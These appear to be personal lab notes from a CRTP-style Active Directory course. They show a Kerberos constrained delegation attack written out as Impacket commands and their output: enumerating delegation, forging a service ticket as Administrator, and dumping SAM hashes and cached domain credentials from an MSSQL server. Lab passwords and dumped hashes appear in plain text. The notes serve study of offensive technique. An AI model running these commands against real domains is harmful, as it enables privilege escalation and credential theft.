#### Theory can be found in [[2. Domain Privilege Escalation#4. KCD]] ####

- Query the DC for Delegation
```
â”Œâ”€â”€(rootðŸ’€0xDe4dBe3f)-[/home/â€¦/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
â””â”€# impacket-findDelegation dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A -dc-ip 172.16.2.1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName      AccountType  DelegationType                      DelegationRightsTo                          
---------------  -----------  ----------------------------------  -------------------------------------------
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL    
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-DC                               
DCORP-APPSRV$    Computer     Unconstrained                       N/A                                         
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL 
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql
```

- Request a ST on behalf of the Administrator.
```
â”Œâ”€â”€(rootðŸ’€0xDe4dBe3f)-[/home/â€¦/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
â””â”€# impacket-getST dollarcorp.moneycorp.local/websvc:'AServicewhichIsNotM3@nttoBe' -spn 'cifs/dcorp-mssql.dollarcorp.moneycorp.local' -impersonate 'Administrator' -dc-ip 172.16.2.1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

- Loot the `DCORP-MSSQL` server.
```
â”Œâ”€â”€(rootðŸ’€0xDe4dBe3f)-[/home/â€¦/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
â””â”€# export KRB5CCNAME=Administrator.ccache
```

```
â””â”€# impacket-secretsdump 'dollarcorp.moneycorp.local/Administrator'@DCORP-MSSQL.DOLLARCORP.MONEYCORP.LOCAL -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9eaa7e4b729f737e41b358f1fb922900
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b91553e7b82e0b0328bad2ac4b01a2a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DOLLARCORP.MONEYCORP.LOCAL/sqladmin:$DCC2$10240#sqladmin#390b3bf7a33ef677ff67c1b09803c428

<snip>
```
